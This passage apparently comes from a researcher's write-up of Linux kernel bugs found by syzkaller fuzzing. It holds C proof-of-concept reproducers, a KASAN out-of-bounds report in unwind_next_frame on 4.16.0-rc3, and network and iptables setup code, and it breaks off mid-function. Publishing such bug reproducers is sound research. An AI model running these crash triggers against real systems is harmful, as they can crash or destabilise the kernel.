{\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tremove_dir(cwdbuf);\n\t\treset_net_namespace();\n\t}\n}\n\nstruct thread_t {\n\tint created, running, call;\n\tpthread_t th;\n};\n\nstatic struct thread_t threads[16];\nstatic void execute_call(int call);\nstatic int running;\nstatic int collide;\n\nstatic void* thr(void* arg)\n{\n\tstruct thread_t* th = (struct thread_t*)arg;\n\tfor (;;) {\n\t\twhile (!__atomic_load_n(&th->running, __ATOMIC_ACQUIRE))\n\t\t\tsyscall(SYS_futex, &th->running, FUTEX_WAIT, 0, 0);\n\t\texecute_call(th->call);\n\t\t__atomic_fetch_sub(&running, 1, __ATOMIC_RELAXED);\n\t\t__atomic_store_n(&th->running, 0, __ATOMIC_RELEASE);\n\t\tsyscall(SYS_futex, &th->running, FUTEX_WAKE);\n\t}\n\treturn 0;\n}\n\nstatic void execute(int num_calls)\n{\n\tint call, thread;\n\trunning = 0;\n\tfor (call = 0; call < num_calls; call++) {\n\t\tfor (thread = 0; thread < sizeof(threads) / sizeof(threads[0]); thread++) {\n\t\t\tstruct thread_t* th = &threads[thread];\n\t\t\tif (!th->created) {\n\t\t\t\tth->created = 1;\n\t\t\t\tpthread_attr_t attr;\n\t\t\t\tpthread_attr_init(&attr);\n\t\t\t\tpthread_attr_setstacksize(&attr, 128 << 10);\n\t\t\t\tpthread_create(&th->th, &attr, thr, th);\n\t\t\t}\n\t\t\tif (!__atomic_load_n(&th->running, __ATOMIC_ACQUIRE)) {\n\t\t\t\tth->call = call;\n\t\t\t\t__atomic_fetch_add(&running, 1, __ATOMIC_RELAXED);\n\t\t\t\t__atomic_store_n(&th->running, 1, __ATOMIC_RELEASE);\n\t\t\t\tsyscall(SYS_futex, &th->running, FUTEX_WAKE);\n\t\t\t\tif (collide && call % 2)\n\t\t\t\t\tbreak;\n\t\t\t\tstruct timespec ts;\n\t\t\t\tts.tv_sec = 0;\n\t\t\t\tts.tv_nsec = 20 * 1000 * 1000;\n\t\t\t\tsyscall(SYS_futex, &th->running, FUTEX_WAIT, 1, &ts);\n\t\t\t\tif (running)\n\t\t\t\t\tusleep((call == num_calls - 1) ? 10000 : 1000);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n}\n\nuint64_t r[2] = {0x0, 0xffffffffffffffff};\nuint64_t procid;\nvoid execute_call(int call)\n{\n\tlong res;\tswitch (call) {\n\tcase 0:\nmemcpy((void*)0x20000440, \"keyring\", 8);\n*(uint8_t*)0x20000480 = 0x73;\n*(uint8_t*)0x20000481 = 0x79;\n*(uint8_t*)0x20000482 = 0x7a;\n*(uint8_t*)0x20000483 = 0;\n*(uint8_t*)0x20000484 = 0;\n\t\tres = syscall(__NR_add_key, 0x20000440, 0x20000480, 0, 0, 0xfffffffe);\n\t\tif (res != -1)\n\t\t\t\tr[0] = res;\n\t\tbreak;\n\tcase 1:\n\t\tsyscall(__NR_keyctl, 9, r[0], r[0]);\n\t\tbreak;\n\tcase 2:\nmemcpy((void*)0x20000000, \"/selinux/enforce\", 17);\n\t\tres = syscall(__NR_openat, 0xffffffffffffff9c, 0x20000000, 2, 0);\n\t\tif (res != -1)\n\t\t\t\tr[1] = res;\n\t\tbreak;\n\tcase 3:\n\t\tsyscall(__NR_ioctl, r[1], 0x8904, 0x20000040);\n\t\tbreak;\n\tcase 4:\n*(uint32_t*)0x20000280 = 8;\n\t\tsyscall(__NR_getpeername, r[1], 0x20000240, 0x20000280);\n\t\tbreak;\n\tcase 5:\n*(uint32_t*)0x20000340 = 4;\n\t\tsyscall(__NR_getsockopt, r[1], 0, 0xc, 0x20000300, 0x20000340);\n\t\tbreak;\n\t}\n}\n\nvoid test()\n{\n\texecute(6);\n\tcollide = 1;\n\texecute(6);\n}\n\nint main()\n{\n\tsyscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);\n\tchar *cwd = get_current_dir_name();\n\tfor (procid = 0; procid < 8; procid++) {\n\t\tif (fork() == 0) {\n\t\t\tfor (;;) {\n\t\t\t\tif (chdir(cwd))\n\t\t\t\t\tfail(\"failed to chdir\");\n\t\t\t\tuse_temporary_dir();\n\t\t\t\tint pid = do_sandbox_setuid();\n\t\t\t\tint status = 0;\n\t\t\t\twhile (waitpid(pid, &status, __WALL) != pid) {}\n\t\t\t}\n\t\t}\n\t}\n\tsleep(1000000);\n\treturn 0;\n}\n\n```\n\n## unwind_next_frame - alloca Out Of Bounds\n\nGot from syzkaller & Found in LK v4.16.0-rc3. But it's not useful info. As before, there's a similar bug that I found.\nAs committer said, this bug is natural and of course not useful stuff.\n\n*link* : [unwind_orc-out_of_bounds](https://kozistr.github.io/2017/12/16/LK-unwind_orc-oob.html)\n\n### Call Trace (Dump)\n\n```c\n[  163.982226] ==================================================================\n[  163.984549] BUG: KASAN: alloca-out-of-bounds in unwind_next_frame+0x18a0/0x1920\n[  163.986378] Read of size 8 at addr ffff88005a9878c0 by task poc/2752\n[  163.987829] \n[  163.988229] CPU: 0 PID: 2752 Comm: poc Not tainted 4.16.0-rc3+ #6\n[  163.989674] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[  163.991730] Call Trace:\n[  163.992180]  <IRQ>\n[  163.992518]  dump_stack+0xd7/0x154\n[  163.993118]  ? unwind_next_frame+0x18a0/0x1920\n[  163.994093]  print_address_description+0x60/0x22b\n[  163.995264]  ? unwind_next_frame+0x18a0/0x1920\n[  163.996411]  kasan_report.cold.6+0xac/0x2f4\n[  163.997455]  ? unwind_next_frame+0x18a0/0x1920\n[  163.998528]  ? apic_timer_interrupt+0xf/0x20\n[  163.999557]  ? deref_stack_reg+0xe0/0xe0\n[  164.000293]  ? apic_timer_interrupt+0xf/0x20\n[  164.001134]  ? __save_stack_trace+0x7d/0xf0\n[  164.001962]  ? __memset+0x29/0x30\n[  164.002616]  ? save_stack+0x32/0xb0\n[  164.003298]  ? __kasan_slab_free+0x12c/0x170\n[  164.004129]  ? kmem_cache_free+0xc1/0x300\n[  164.004906]  ? rcu_process_callbacks+0x814/0x1dc0\n[  164.005807]  ? __do_softirq+0x213/0x915\n[  164.006545]  ? irq_exit+0x1a2/0x1d0\n[  164.007272]  ? smp_apic_timer_interrupt+0xf1/0x500\n[  164.008520]  ? apic_timer_interrupt+0xf/0x20\n[  164.009794]  ? debug_check_no_locks_freed+0x210/0x210\n[  164.011065]  ? debug_check_no_locks_freed+0x210/0x210\n[  164.012342]  ? find_held_lock+0x33/0x1c0\n[  164.013289]  ? mark_held_locks+0xc1/0x140\n[  164.014098]  ? kmem_cache_free+0x152/0x300\n[  164.014998]  ? __kasan_slab_free+0x12c/0x170\n[  164.015695]  ? rcu_process_callbacks+0x814/0x1dc0\n[  164.016483]  ? kmem_cache_free+0xc1/0x300\n[  164.017174]  ? get_object+0x80/0x80\n[  164.018026]  ? rcu_process_callbacks+0x814/0x1dc0\n[  164.018974]  ? note_gp_changes+0x1e0/0x1e0\n[  164.019836]  ? __do_softirq+0x213/0x915\n[  164.020656]  ? irq_exit+0x1a2/0x1d0\n[  164.021375]  ? smp_apic_timer_interrupt+0xf1/0x500\n[  164.022346]  ? apic_timer_interrupt+0xf/0x20\n[  164.023225]  </IRQ>\n[  164.023716]  ? __memset+0x29/0x30\n[  164.024397]  ? debug_check_no_locks_freed+0x210/0x210\n[  164.025396]  ? kasan_unpoison_shadow+0x30/0x40\n[  164.026288]  ? crypto_shash_update+0x24d/0x2a0\n[  164.027278]  ? ext4_inode_csum.isra.60+0x2f1/0x8f0\n[  164.028043]  ? ext4_journalled_zero_new_buffers+0x410/0x410\n[  164.028987]  ? from_kprojid+0x89/0xc0\n[  164.029601]  ? ext4_inode_csum_set+0x1ad/0x3c0\n[  164.030653]  ? ext4_mark_iloc_dirty+0x1616/0x2a50\n[  164.031704]  ? ext4_chunk_trans_blocks+0x20/0x20\n[  164.032557]  ? __ext4_journal_get_write_access+0x143/0x200\n[  164.033437]  ? ext4_mark_inode_dirty+0x204/0x890\n[  164.034234]  ? ext4_rmdir+0x7e2/0xc10\n[  164.035128]  ? ext4_expand_extra_isize+0x500/0x500\n[  164.035921]  ? mark_held_locks+0xc1/0x140\n[  164.036648]  ? timespec_trunc+0xea/0x180\n[  164.037294]  ? current_kernel_time64+0x120/0x140\n[  164.038016]  ? ext4_rmdir+0x7e2/0xc10\n[  164.038616]  ? ext4_rename2+0x210/0x210\n[  164.039262]  ? vfs_rmdir+0x24c/0x470\n[  164.039917]  ? do_rmdir+0x364/0x420\n[  164.040687]  ? user_path_create+0x40/0x40\n[  164.041628]  ? _raw_spin_unlock_irq+0x24/0x40\n[  164.042456]  ? _raw_spin_unlock_irq+0x24/0x40\n[  164.043311]  ? task_work_run+0x113/0x1c0\n[  164.044071]  ? do_syscall_64+0x43/0x6b0\n[  164.044841]  ? SyS_mkdir+0x260/0x260\n[  164.045598]  ? do_syscall_64+0x1b7/0x6b0\n[  164.046418]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7\n[  164.047648] \n[  164.047971] The buggy address belongs to the page:\n[  164.048763] page:ffffea00016a61c0 count:0 mapcount:0 mapping:0000000000000000 index:0x0\n[  164.050054] flags: 0x100000000000000()\n[  164.050648] raw: 0100000000000000 0000000000000000 0000000000000000 00000000ffffffff\n[  164.051948] raw: 0000000000000000 ffffea00016a61e0 0000000000000000 0000000000000000\n[  164.053383] page dumped because: kasan: bad access detected\n[  164.054483] \n[  164.054732] Memory state around the buggy address:\n[  164.055513]  ffff88005a987780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n[  164.056689]  ffff88005a987800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n[  164.058088] >ffff88005a987880: 00 00 00 00 00 00 00 00 cb cb cb cb 00 00 00 00\n[  164.059202]                                            ^\n[  164.060069]  ffff88005a987900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n[  164.061549]  ffff88005a987980: 00 f1 f1 f1 f1 02 f2 f2 f2 f2 f2 f2 f2 00 00 00\n[  164.062649] ==================================================================\n[  164.063841] Disabling lock debugging due to kernel taint\n\nMessage from syslogd@zer0day at Mar  3 16:44:33 ...\n kernel:[  164.048763] page:ffffea00016a61c0 count:0 mapcount:0 mapping:0000000000000000 index:0x0\n\nMessage from syslogd@zer0day at Mar  3 16:44:33 ...\n kernel:[  164.050054] flags: 0x100000000000000()\n```\n\n### PoC\n\nHere's reproducible PoC code generated by syzkaller.\n\n```c\n#define _GNU_SOURCE \n\n#include <endian.h>\n#include <sys/syscall.h>\n#include <unistd.h>\n#include <errno.h>\n#include <signal.h>\n#include <stdarg.h>\n#include <stdio.h>\n#include <sys/time.h>\n#include <sys/wait.h>\n#include <time.h>\n#include <sys/prctl.h>\n#include <dirent.h>\n#include <sys/mount.h>\n#include <arpa/inet.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <linux/if.h>\n#include <linux/if_ether.h>\n#include <linux/if_tun.h>\n#include <linux/ip.h>\n#include <linux/tcp.h>\n#include <net/if_arp.h>\n#include <stdarg.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/ioctl.h>\n#include <sys/stat.h>\n#include <sys/uio.h>\n#include <linux/net.h>\n#include <netinet/in.h>\n#include <sys/socket.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <sys/ioctl.h>\n#include <sys/stat.h>\n\n__attribute__((noreturn)) static void doexit(int status)\n{\n\tvolatile unsigned i;\n\tsyscall(__NR_exit_group, status);\n\tfor (i = 0;; i++) {\n\t}\n}\n\n#include <stdint.h>\n#include <string.h>\n#include <errno.h>\n#include <stdarg.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/stat.h>\n\nconst int kFailStatus = 67;\nconst int kRetryStatus = 69;\n\nstatic void fail(const char* msg, ...)\n{\n\tint e = errno;\n\tva_list args;\n\tva_start(args, msg);\n\tvfprintf(stderr, msg, args);\n\tva_end(args);\n\tfprintf(stderr, \" (errno %d)\\n\", e);\n\tdoexit((e == ENOMEM || e == EAGAIN) ? kRetryStatus : kFailStatus);\n}\n\nstatic void exitf(const char* msg, ...)\n{\n\tint e = errno;\n\tva_list args;\n\tva_start(args, msg);\n\tvfprintf(stderr, msg, args);\n\tva_end(args);\n\tfprintf(stderr, \" (errno %d)\\n\", e);\n\tdoexit(kRetryStatus);\n}\n\nstatic uint64_t current_time_ms()\n{\n\tstruct timespec ts;\n\n\tif (clock_gettime(CLOCK_MONOTONIC, &ts))\n\t\tfail(\"clock_gettime failed\");\n\treturn (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;\n}\n\nstatic void use_temporary_dir()\n{\n\tchar tmpdir_template[] = \"./syzkaller.XXXXXX\";\n\tchar* tmpdir = mkdtemp(tmpdir_template);\n\tif (!tmpdir)\n\t\tfail(\"failed to mkdtemp\");\n\tif (chmod(tmpdir, 0777))\n\t\tfail(\"failed to chmod\");\n\tif (chdir(tmpdir))\n\t\tfail(\"failed to chdir\");\n}\n\nstatic void vsnprintf_check(char* str, size_t size, const char* format, va_list args)\n{\n\tint rv;\n\n\trv = vsnprintf(str, size, format, args);\n\tif (rv < 0)\n\t\tfail(\"tun: snprintf failed\");\n\tif ((size_t)rv >= size)\n\t\tfail(\"tun: string '%s...' doesn't fit into buffer\", str);\n}\n\nstatic void snprintf_check(char* str, size_t size, const char* format, ...)\n{\n\tva_list args;\n\n\tva_start(args, format);\n\tvsnprintf_check(str, size, format, args);\n\tva_end(args);\n}\n\n#define COMMAND_MAX_LEN 128\n#define PATH_PREFIX \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \"\n#define PATH_PREFIX_LEN (sizeof(PATH_PREFIX) - 1)\n\nstatic void execute_command(bool panic, const char* format, ...)\n{\n\tva_list args;\n\tchar command[PATH_PREFIX_LEN + COMMAND_MAX_LEN];\n\tint rv;\n\n\tva_start(args, format);\n\tmemcpy(command, PATH_PREFIX, PATH_PREFIX_LEN);\n\tvsnprintf_check(command + PATH_PREFIX_LEN, COMMAND_MAX_LEN, format, args);\n\trv = system(command);\n\tif (panic && rv != 0)\n\t\tfail(\"tun: command \\\"%s\\\" failed with code %d\", &command[0], rv);\n\n\tva_end(args);\n}\n\nstatic int tunfd = -1;\nstatic int tun_frags_enabled;\n\n#define SYZ_TUN_MAX_PACKET_SIZE 1000\n\n#define TUN_IFACE \"syz_tun\"\n\n#define LOCAL_MAC \"aa:aa:aa:aa:aa:aa\"\n#define REMOTE_MAC \"aa:aa:aa:aa:aa:bb\"\n\n#define LOCAL_IPV4 \"172.20.20.170\"\n#define REMOTE_IPV4 \"172.20.20.187\"\n\n#define LOCAL_IPV6 \"fe80::aa\"\n#define REMOTE_IPV6 \"fe80::bb\"\n\n#define IFF_NAPI 0x0010\n#define IFF_NAPI_FRAGS 0x0020\n\nstatic void initialize_tun(void)\n{\n\ttunfd = open(\"/dev/net/tun\", O_RDWR | O_NONBLOCK);\n\tif (tunfd == -1) {\n\t\tprintf(\"tun: can't open /dev/net/tun: please enable CONFIG_TUN=y\\n\");\n\t\tprintf(\"otherwise fuzzing or reproducing might not work as intended\\n\");\n\t\treturn;\n\t}\n\tconst int kTunFd = 252;\n\tif (dup2(tunfd, kTunFd) < 0)\n\t\tfail(\"dup2(tunfd, kTunFd) failed\");\n\tclose(tunfd);\n\ttunfd = kTunFd;\n\n\tstruct ifreq ifr;\n\tmemset(&ifr, 0, sizeof(ifr));\n\tstrncpy(ifr.ifr_name, TUN_IFACE, IFNAMSIZ);\n\tifr.ifr_flags = IFF_TAP | IFF_NO_PI | IFF_NAPI | IFF_NAPI_FRAGS;\n\tif (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0) {\n\t\tifr.ifr_flags = IFF_TAP | IFF_NO_PI;\n\t\tif (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0)\n\t\t\tfail(\"tun: ioctl(TUNSETIFF) failed\");\n\t}\n\tif (ioctl(tunfd, TUNGETIFF, (void*)&ifr) < 0)\n\t\tfail(\"tun: ioctl(TUNGETIFF) failed\");\n\ttun_frags_enabled = (ifr.ifr_flags & IFF_NAPI_FRAGS) != 0;\n\n\texecute_command(1, \"sysctl -w net.ipv6.conf.%s.accept_dad=0\", TUN_IFACE);\n\n\texecute_command(1, \"sysctl -w net.ipv6.conf.%s.router_solicitations=0\", TUN_IFACE);\n\n\texecute_command(1, \"ip link set dev %s address %s\", TUN_IFACE, LOCAL_MAC);\n\texecute_command(1, \"ip addr add %s/24 dev %s\", LOCAL_IPV4, TUN_IFACE);\n\texecute_command(1, \"ip -6 addr add %s/120 dev %s\", LOCAL_IPV6, TUN_IFACE);\n\texecute_command(1, \"ip neigh add %s lladdr %s dev %s nud permanent\",\n\t\t\tREMOTE_IPV4, REMOTE_MAC, TUN_IFACE);\n\texecute_command(1, \"ip -6 neigh add %s lladdr %s dev %s nud permanent\",\n\t\t\tREMOTE_IPV6, REMOTE_MAC, TUN_IFACE);\n\texecute_command(1, \"ip link set dev %s up\", TUN_IFACE);\n}\n\n#define DEV_IPV4 \"172.20.20.%d\"\n#define DEV_IPV6 \"fe80::%02hx\"\n#define DEV_MAC \"aa:aa:aa:aa:aa:%02hx\"\n\nstatic void initialize_netdevices(void)\n{\n\tunsigned i;\n\tconst char* devtypes[] = {\"ip6gretap\", \"bridge\", \"vcan\", \"bond\", \"veth\"};\n\tconst char* devnames[] = {\"lo\", \"sit0\", \"bridge0\", \"vcan0\", \"tunl0\",\n\t\t\t\t  \"gre0\", \"gretap0\", \"ip_vti0\", \"ip6_vti0\",\n\t\t\t\t  \"ip6tnl0\", \"ip6gre0\", \"ip6gretap0\",\n\t\t\t\t  \"erspan0\", \"bond0\", \"veth0\", \"veth1\"};\n\n\tfor (i = 0; i < sizeof(devtypes) / (sizeof(devtypes[0])); i++)\n\t\texecute_command(0, \"ip link add dev %s0 type %s\", devtypes[i], devtypes[i]);\n\texecute_command(0, \"ip link add dev veth1 type veth\");\n\tfor (i = 0; i < sizeof(devnames) / (sizeof(devnames[0])); i++) {\n\t\tchar addr[32];\n\t\tsnprintf_check(addr, sizeof(addr), DEV_IPV4, i + 10);\n\t\texecute_command(0, \"ip -4 addr add %s/24 dev %s\", addr, devnames[i]);\n\t\tsnprintf_check(addr, sizeof(addr), DEV_IPV6, i + 10);\n\t\texecute_command(0, \"ip -6 addr add %s/120 dev %s\", addr, devnames[i]);\n\t\tsnprintf_check(addr, sizeof(addr), DEV_MAC, i + 10);\n\t\texecute_command(0, \"ip link set dev %s address %s\", devnames[i], addr);\n\t\texecute_command(0, \"ip link set dev %s up\", devnames[i]);\n\t}\n}\n\nstatic int read_tun(char* data, int size)\n{\n\tif (tunfd < 0)\n\t\treturn -1;\n\n\tint rv = read(tunfd, data, size);\n\tif (rv < 0) {\n\t\tif (errno == EAGAIN)\n\t\t\treturn -1;\n\t\tif (errno == EBADFD)\n\t\t\treturn -1;\n\t\tfail(\"tun: read failed with %d\", rv);\n\t}\n\treturn rv;\n}\n\nstatic void flush_tun()\n{\n\tchar data[SYZ_TUN_MAX_PACKET_SIZE];\n\twhile (read_tun(&data[0], sizeof(data)) != -1)\n\t\t;\n}\n\nstatic uintptr_t syz_open_pts(uintptr_t a0, uintptr_t a1)\n{\n\tint ptyno = 0;\n\tif (ioctl(a0, TIOCGPTN, &ptyno))\n\t\treturn -1;\n\tchar buf[128];\n\tsprintf(buf, \"/dev/pts/%d\", ptyno);\n\treturn open(buf, a1, 0);\n}\n\n#define XT_TABLE_SIZE 1536\n#define XT_MAX_ENTRIES 10\n\nstruct xt_counters {\n\tuint64_t pcnt, bcnt;\n};\n\nstruct ipt_getinfo {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int hook_entry[5];\n\tunsigned int underflow[5];\n\tunsigned int num_entries;\n\tunsigned int size;\n};\n\nstruct ipt_get_entries {\n\tchar name[32];\n\tunsigned int size;\n\tvoid* entrytable[XT_TABLE_SIZE / sizeof(void*)];\n};\n\nstruct ipt_replace {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int num_entries;\n\tunsigned int size;\n\tunsigned int hook_entry[5];\n\tunsigned int underflow[5];\n\tunsigned int num_counters;\n\tstruct xt_counters* counters;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstruct ipt_table_desc {\n\tconst char* name;\n\tstruct ipt_getinfo info;\n\tstruct ipt_replace replace;\n};\n\nstatic struct ipt_table_desc ipv4_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"mangle\"},\n    {.name = \"raw\"},\n    {.name = \"security\"},\n};\n\nstatic struct ipt_table_desc ipv6_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"mangle\"},\n    {.name = \"raw\"},\n    {.name = \"security\"},\n};\n\n#define IPT_BASE_CTL 64\n#define IPT_SO_SET_REPLACE (IPT_BASE_CTL)\n#define IPT_SO_GET_INFO (IPT_BASE_CTL)\n#define IPT_SO_GET_ENTRIES (IPT_BASE_CTL + 1)\n\nstruct arpt_getinfo {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int hook_entry[3];\n\tunsigned int underflow[3];\n\tunsigned int num_entries;\n\tunsigned int size;\n};\n\nstruct arpt_get_entries {\n\tchar name[32];\n\tunsigned int size;\n\tvoid* entrytable[XT_TABLE_SIZE / sizeof(void*)];\n};\n\nstruct arpt_replace {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int num_entries;\n\tunsigned int size;\n\tunsigned int hook_entry[3];\n\tunsigned int underflow[3];\n\tunsigned int num_counters;\n\tstruct xt_counters* counters;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstruct arpt_table_desc {\n\tconst char* name;\n\tstruct arpt_getinfo info;\n\tstruct arpt_replace replace;\n};\n\nstatic struct arpt_table_desc arpt_tables[] = {\n    {.name = \"filter\"},\n};\n\n#define ARPT_BASE_CTL 96\n#define ARPT_SO_SET_REPLACE (ARPT_BASE_CTL)\n#define ARPT_SO_GET_INFO (ARPT_BASE_CTL)\n#define ARPT_SO_GET_ENTRIES (ARPT_BASE_CTL + 1)\n\nstatic void checkpoint_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)\n{\n\tstruct ipt_get_entries entries;\n\tsocklen_t optlen;\n\tint fd, i;\n\n\tfd = socket(family, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(%d, SOCK_STREAM, IPPROTO_TCP)\", family);\n\tfor (i = 0; i < num_tables; i++) {\n\t\tstruct ipt_table_desc* table = &tables[i];\n\t\tstrcpy(table->info.name, table->name);\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->info);\n\t\tif (getsockopt(fd, level, IPT_SO_GET_INFO, &table->info, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(IPT_SO_GET_INFO)\");\n\t\t}\n\t\tif (table->info.size > sizeof(table->replace.entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->info.size);\n\t\tif (table->info.num_entries > XT_MAX_ENTRIES)\n\t\t\tfail(\"too many counters: %u\", table->info.num_entries);\n\t\tmemset(&entries, 0, sizeof(entries));\n\t\tstrcpy(entries.name, table->name);\n\t\tentries.size = table->info.size;\n\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;\n\t\tif (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\tfail(\"getsockopt(IPT_SO_GET_ENTRIES)\");\n\t\ttable->replace.valid_hooks = table->info.valid_hooks;\n\t\ttable->replace.num_entries = table->info.num_entries;\n\t\ttable->replace.size = table->info.size;\n\t\tmemcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));\n\t\tmemcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));\n\t\tmemcpy(table->replace.entrytable, entries.entrytable, table->info.size);\n\t}\n\tclose(fd);\n}\n\nstatic void reset_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)\n{\n\tstruct xt_counters counters[XT_MAX_ENTRIES];\n\tstruct ipt_get_entries entries;\n\tstruct ipt_getinfo info;\n\tsocklen_t optlen;\n\tint fd, i;\n\n\tfd = socket(family, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(%d, SOCK_STREAM, IPPROTO_TCP)\", family);\n\tfor (i = 0; i < num_tables; i++) {\n\t\tstruct ipt_table_desc* table = &tables[i];\n\t\tif (table->info.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&info, 0, sizeof(info));\n\t\tstrcpy(info.name, table->name);\n\t\toptlen = sizeof(info);\n\t\tif (getsockopt(fd, level, IPT_SO_GET_INFO, &info, &optlen))\n\t\t\tfail(\"getsockopt(IPT_SO_GET_INFO)\");\n\t\tif (memcmp(&table->info, &info, sizeof(table->info)) == 0) {\n\t\t\tmemset(&entries, 0, sizeof(entries));\n\t\t\tstrcpy(entries.name, table->name);\n\t\t\tentries.size = table->info.size;\n\t\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;\n\t\t\tif (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\t\tfail(\"getsockopt(IPT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\ttable->replace.num_counters = info.num_entries;\n\t\ttable->replace.counters = counters;\n\t\toptlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;\n\t\tif (setsockopt(fd, level, IPT_SO_SET_REPLACE, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(IPT_SO_SET_REPLACE)\");\n\t}\n\tclose(fd);\n}\n\nstatic void checkpoint_arptables(void)\n{\n\tstruct arpt_get_entries entries;\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {\n\t\tstruct arpt_table_desc* table = &arpt_tables[i];\n\t\tstrcpy(table->info.name, table->name);\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->info);\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &table->info, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_INFO)\");\n\t\t}\n\t\tif (table->info.size > sizeof(table->replace.entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->info.size);\n\t\tif (table->info.num_entries > XT_MAX_ENTRIES)\n\t\t\tfail(\"too many counters: %u\", table->info.num_entries);\n\t\tmemset(&entries, 0, sizeof(entries));\n\t\tstrcpy(entries.name, table->name);\n\t\tentries.size = table->info.size;\n\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_ENTRIES)\");\n\t\ttable->replace.valid_hooks = table->info.valid_hooks;\n\t\ttable->replace.num_entries = table->info.num_entries;\n\t\ttable->replace.size = table->info.size;\n\t\tmemcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));\n\t\tmemcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));\n\t\tmemcpy(table->replace.entrytable, entries.entrytable, table->info.size);\n\t}\n\tclose(fd);\n}\n\nstatic void reset_arptables()\n{\n\tstruct xt_counters counters[XT_MAX_ENTRIES];\n\tstruct arpt_get_entries entries;\n\tstruct arpt_getinfo info;\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {\n\t\tstruct arpt_table_desc* table = &arpt_tables[i];\n\t\tif (table->info.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&info, 0, sizeof(info));\n\t\tstrcpy(info.name, table->name);\n\t\toptlen = sizeof(info);\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &optlen))\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_INFO)\");\n\t\tif (memcmp(&table->info, &info, sizeof(table->info)) == 0) {\n\t\t\tmemset(&entries, 0, sizeof(entries));\n\t\t\tstrcpy(entries.name, table->name);\n\t\t\tentries.size = table->info.size;\n\t\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;\n\t\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\t\tfail(\"getsockopt(ARPT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\ttable->replace.num_counters = info.num_entries;\n\t\ttable->replace.counters = 